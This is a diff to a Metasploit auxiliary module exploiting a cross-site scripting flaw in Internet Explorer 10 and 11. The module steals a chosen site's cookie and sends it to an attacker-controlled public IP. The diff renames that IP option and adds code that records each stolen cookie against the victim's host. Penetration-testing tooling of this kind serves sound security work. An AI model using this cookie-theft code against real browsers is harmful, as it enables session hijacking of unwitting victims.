@@ -15,9 +15,9 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
           This module exploits a universal cross-site scripting vulnerability found in Internet
           Explorer 10 and 11. It will steal the cookie of a specific webiste (set by the TARGET_URI
-          datastore option). You will also most likely need to configure the SERVER_PUBLIC_IP
+          datastore option). You will also most likely need to configure the MY_PUBLIC_IP
           datastore option in order receive the cookie. If you and the victim are actually in the
-          same network, then you don't need to touch SERVER_PUBLIC_IP.
+          same network, then you don't need to touch MY_PUBLIC_IP.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
     [
       OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
-      OptString.new('SERVER_PUBLIC_IP', [ false, 'The exploit\'s public facing IP (Default: Internal IP)']),
+      OptString.new('MY_PUBLIC_IP', [ false, 'The exploit\'s public facing IP (Default: Internal IP)']),
     ], self.class)
   end
 
@@ -67,8 +67,8 @@ class Metasploit3 < Msf::Auxiliary
     proto = (ssl ? "https://" : "http://")
     if datastore['URIHOST']
       host = datastore['URIHOST']
-    elsif datastore['SERVER_PUBLIC_IP']
-      host = datastore['SERVER_PUBLIC_IP']
+    elsif datastore['MY_PUBLIC_IP']
+      host = datastore['MY_PUBLIC_IP']
     elsif (cli and cli.peerhost)
       host = Rex::Socket.source_address(cli.peerhost)
     else
@@ -134,6 +134,11 @@ class Metasploit3 < Msf::Auxiliary
       else
         print_status("Got cookie")
         print_line(data)
+        report_note(
+          :host => cli.peerhost,
+          :type => 'ie.cookie',
+          :data => data
+        )
       end
     else
       print_status("sending html")
